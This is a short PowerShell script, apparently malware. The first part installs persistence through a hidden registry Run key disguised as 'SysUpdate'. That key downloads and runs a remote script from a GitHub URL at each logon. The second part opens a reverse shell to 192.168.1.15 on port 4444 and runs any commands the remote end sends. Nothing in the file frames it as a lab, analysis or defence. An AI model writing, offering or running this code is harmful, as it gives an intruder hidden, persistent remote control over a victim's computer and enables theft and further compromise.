# shell_v2.ps1 - PERSISTENCE ONLY (3 lines)
$regPath="HKCU:\Software\Microsoft\Windows\CurrentVersion\Run";$regName="SysUpdate";$regValue="powershell -w hidden -nop -WindowStyle Hidden -c \"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/B15cu1t/shell.ps1/main/shell_v2.ps1')\"";New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null

# YOUR WORKING SHELL (unchanged)
$client = New-Object System.Net.Sockets.TCPClient("192.168.1.15",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
